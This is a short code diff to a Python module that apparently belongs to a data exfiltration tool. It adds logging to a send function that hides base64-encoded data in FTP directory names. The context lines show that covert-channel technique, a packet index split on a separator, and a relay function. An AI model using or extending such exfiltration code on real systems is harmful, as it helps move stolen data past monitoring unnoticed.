@@ -42,7 +42,11 @@ def send(data):
 
     try:
         ftp.mkd(base64.b64encode(data))
-    except:
+        packet_index = data.split('|!|')[1]
+        app_exfiltrate.log_message(
+            'info', "[ftp] Sending {0} bytes with FTP packet to {1}. PacketIndex = {2}".format(len(data), target, packet_index))
+    except Exception as e:
+        print(e)
         pass
 
 def relay_ftp_mkdir(data):
